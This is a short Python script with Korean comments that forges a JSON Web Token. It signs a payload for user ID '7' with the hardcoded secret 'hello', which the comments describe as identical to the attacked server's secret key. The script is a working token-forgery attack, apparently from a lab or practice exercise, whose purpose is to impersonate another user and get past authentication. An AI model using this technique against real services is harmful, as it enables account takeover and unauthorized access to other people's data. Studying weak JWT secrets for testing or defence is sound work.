import jwt
import datetime
JWT_SECRET = 'hello'#공격 대상인 서버의 비밀키와 동일
JWT_ALGORITHM = 'HS256'
payload = {
    'user_id': "7",#공격 대상인 사용자의 아이디
    'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}
token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
print(f"Generated JWT: {token}")